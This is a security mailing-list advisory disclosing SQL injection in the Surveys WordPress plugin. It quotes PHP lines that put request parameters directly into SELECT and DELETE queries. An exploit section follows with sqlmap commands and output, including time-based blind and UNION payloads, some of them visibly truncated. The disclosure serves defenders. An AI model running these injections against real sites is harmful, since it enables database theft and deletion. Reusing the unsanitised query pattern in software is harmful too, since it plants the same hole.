  oss-security - SQL Injection in Wordpress plugin surveys            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 30 May From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: SQL Injection in Wordpress plugin surveys  Title: SQL Injection in Wordpress plugin surveys Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/surveys/ Vendor: http://www.binnyva.com/ Vendor Notified: Vendor Contact: binnyva@...il.com Advisory: Description: The Surveys WordPress plugin lets you add surveys to your blog. You can let the visitors take surveys and see the result from the admin side. Vulnerability:  The following code in survey_form.php does not sanitize $_REQUEST['action'] before placing it inside of an SQL query:  10:	$survey_details = $wpdb->get_row("SELECT name,description,status FROM {$wpdb->prefix}surveys_survey WHERE ID=$_REQUEST[survey]");   The following code in individual_responses.php does not sanitize input from $survey_id or $_REQUEST[result] before placing it inside of an SQL query:     5 $survey_id = $_REQUEST['survey'];   6 $survey_details = $wpdb->get_row("SELECT ID, name FROM {$wpdb->prefix}surveys_survey WHERE ID=$survey_id");   7    8 if(isset($_REQUEST['action']) and $_REQUEST['action'] == 'delete') {   9         $wpdb->query("DELETE FROM {$wpdb->prefix}surveys_result_answer WHERE result_ID=$_REQUEST[result]");  10         $wpdb->query("DELETE FROM {$wpdb->prefix}surveys_result WHERE ID=$_REQUEST[result]");   In questions.php $_REQUEST[survey] is injectable as it is passed directly into the SQL statement: 94 $all_question = $wpdb->get_results("SELECT Q.ID,Q.question,(SELECT COUNT(*) FROM {$wpdb->prefix}surveys_answer WHERE question_id=Q.ID) AS answer_count  95                                                                                 FROM {$wpdb->prefix}surveys_question AS Q  96                                                                                 WHERE Q.survey_id=$_REQUEST[survey]");   Exploit Code: 	• $ sqlmap -u --dbms mysql  --level 1 --risk 1 --load-cookies=./cookies.txt 	•   	•   	• [INFO] URI parameter '#1*' is 'MySQL UNION query (random number) - 1 to 20 columns' injectable 	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]  	• sqlmap identified the following injection point(s) with a total of HTTP(s) requests: 	• --- 	• Parameter: #1* (URI) 	•     Type: error-based 	•     Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR) 	•     Payload: FROM(SELECT FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&action=edit 	•   	•     Type: AND/OR time-based blind 	•     Title: MySQL >= time-based blind - Parameter replace 	•     Payload: WHEN THEN SLEEP(5) ELSE END)&action=edit 	•   	•     Type: UNION query 	•     Title: MySQL UNION query (random number) - 3 columns 	•     Payload: UNION ALL SELECT 	• --- 	• [INFO] the back-end DBMS is MySQL 	• web server operating system: Linux Ubuntu (xenial) 	• web application technology: Apache 	• back-end DBMS: MySQL >= 5.0 	• [INFO] fetched data logged to text files under 	•   	• [*] shutting down at 	•   	•   	• $ sqlmap -u 'http://example.com/wordpress/wp-admin/edit.php?page=surveys%2Fquestion.php&survey=*' --dbms mysql  --level 3 --risk 3 --load-cookies=./cookies.txt 	•   	• [INFO] URI parameter '#1*' is 'Generic UNION query (random number) - 1 to 20 columns' injectable 	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]  	• sqlmap identified the following injection point(s) with a total of HTTP(s) requests: 	• --- 	• Parameter: #1* (URI) 	•     Type: AND/OR time-based blind 	•     Title: MySQL >= time-based blind - Parameter replace (substraction) 	•     Payload: http://example.com:80/wordpress/wp-admin/edit.php?page=surveys/question.php&survey=(SELECT * FROM (SELECT(SLEEP(5)))rwrG) 	•   	•     Type: UNION query 	•     Title: Generic UNION query (random number) - 3 columns 	•     Payload: UNION ALL SELECT yWXG 	• --- 	• [INFO] the back-end DBMS is MySQL 	• web server operating system: Linux Ubuntu (xenial) 	• web application technology: Apache 	• back-end DBMS: MySQL >= 	• [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' 	•   	• [*] shutting down at Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      